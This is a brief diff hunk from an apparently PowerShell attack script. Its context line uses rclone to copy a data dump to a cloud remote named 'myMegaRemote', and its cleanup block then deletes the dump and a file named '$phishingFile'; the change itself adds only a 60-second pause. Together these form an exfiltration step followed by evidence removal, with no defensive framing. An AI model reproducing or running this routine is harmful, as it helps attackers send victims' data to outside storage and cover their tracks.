@@ -28,5 +28,6 @@ rclone --config "$env:APPDATA\rclone\rclone.conf" copy $dump myMegaRemote:test -
 
 # Cleanup
 Start-Sleep -Seconds 5
-Remove-Item $dumpPath -Force  
+Remove-Item $dumpPath -Force 
+Start-Sleep -Seconds 60
 Remove-Item $phishingFile -Force
